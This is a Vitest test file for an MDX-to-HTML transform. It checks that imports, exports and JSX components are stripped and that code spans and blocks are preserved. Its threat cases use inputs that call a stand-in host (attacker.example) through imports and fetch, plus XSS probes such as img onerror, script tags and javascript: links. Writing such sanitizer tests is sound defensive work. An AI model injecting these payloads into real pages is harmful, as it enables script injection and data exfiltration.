import { describe, expect, it } from 'vitest';
import { transformMdx } from './index';
import { extractProtectedRegions } from './regions';

describe('extractProtectedRegions', () => {
  it('protects fenced code blocks from the transform', () => {
    const source = '```js\nimport x from "y";\n```';
    const { text, restore } = extractProtectedRegions(source);
    expect(text).not.toContain('import');
    expect(restore(text)).toBe(source);
  });

  it('protects inline code spans', () => {
    const { text, restore } = extractProtectedRegions('Use `<Card />` inline.');
    expect(text).not.toContain('<Card');
    expect(restore(text)).toBe('Use `<Card />` inline.');
  });

  it('protects math delimiters', () => {
    const { text, restore } = extractProtectedRegions('$\\{x\\}$ and $$\\{y\\}$$');
    expect(restore(text)).toBe('$\\{x\\}$ and $$\\{y\\}$$');
  });
});

describe('transformMdx — ADR-0008 threat cases', () => {
  it('removes an import statement without making any request', () => {
    const out = transformMdx('import evil from "https://attacker.example/x.js"\n\nBody.');
    expect(out).not.toContain('import');
    expect(out).not.toContain('attacker.example');
    expect(out).toContain('Body.');
  });

  it('removes an export statement with an arrow-function body', () => {
    const out = transformMdx('export const x = () => fetch("https://attacker.example")\n\nBody.');
    expect(out).not.toContain('export');
    expect(out).not.toContain('fetch');
  });

  it('strips a paired component tag, keeping inner text and discarding attributes', () => {
    const out = transformMdx("<Card onClick={fetch('https://attacker.example')}>Text</Card>");
    expect(out.trim()).toBe('Text');
    expect(out).not.toContain('onClick');
    expect(out).not.toContain('attacker.example');
  });

  it('replaces a self-closing component with a visible placeholder chip', () => {
    const out = transformMdx('<Callout type="warn" />');
    expect(out).toContain('markora-mdx-chip');
    expect(out).toContain('Callout');
    expect(out).not.toContain('type=');
  });

  it('never throws on a dangerouslySetInnerHTML attribute value (safety net is DOMPurify, per ADR-0008)', () => {
    // The embedded `<img ... >` inside the attribute value breaks the tag
    // scanner's ability to treat the whole `<div ...>` as one tag — ADR-0008
    // explicitly documents this case as "stripped by rules 6/9 + DOMPurify",
    // i.e. the transform alone is not expected to fully neutralize it; the
    // full-pipeline (post-sanitize) guarantee is asserted in index.test.ts.
    expect(() =>
      transformMdx('<div dangerouslySetInnerHTML={{__html: "<img src=x onerror=alert(1)>"}} />'),
    ).not.toThrow();
  });

  it('leaves a lowercase HTML tag in place for markdown-it/DOMPurify to arbitrate', () => {
    const out = transformMdx('<img src="x" onerror="alert(1)" />');
    expect(out).toContain('<img');
  });

  it('renders a brace expression as literal text, never evaluated', () => {
    const out = transformMdx('{eval("alert(1)")}');
    expect(out).toBe('{eval("alert(1)")}');
  });

  it('leaves a script tag for DOMPurify to remove', () => {
    const out = transformMdx('<script>alert(1)</script>');
    expect(out).toContain('<script>');
  });

  it('leaves a javascript: link for the sanitizer URL allowlist to block', () => {
    const out = transformMdx('<a href="javascript:alert(1)">x</a>');
    expect(out).toContain('javascript:alert(1)');
  });

  it('leaves import syntax inside a fenced code block untouched', () => {
    const out = transformMdx("Text.\n\n```js\nimport x from 'y'\n```\n");
    expect(out).toContain("import x from 'y'");
  });

  it('never throws on unbalanced/garbage JSX', () => {
    expect(() => transformMdx('<Card <<>')).not.toThrow();
  });

  it('removes MDX comments', () => {
    const out = transformMdx('Before {/* a comment */} after.');
    expect(out).not.toContain('comment');
    expect(out).toContain('Before');
    expect(out).toContain('after.');
  });

  it('strips a multi-line brace-balanced import specifier list', () => {
    const out = transformMdx('import {\n  a,\n  b,\n} from "x"\n\nBody.');
    expect(out).not.toContain('import');
    expect(out).not.toContain('from "x"');
    expect(out).toContain('Body.');
  });

  it('strips nested capitalized components, keeping the innermost text', () => {
    const out = transformMdx('<Tabs><Tab>One</Tab><Tab>Two</Tab></Tabs>');
    expect(out).not.toContain('<Tabs');
    expect(out).not.toContain('<Tab>');
    expect(out).toContain('One');
    expect(out).toContain('Two');
  });
});
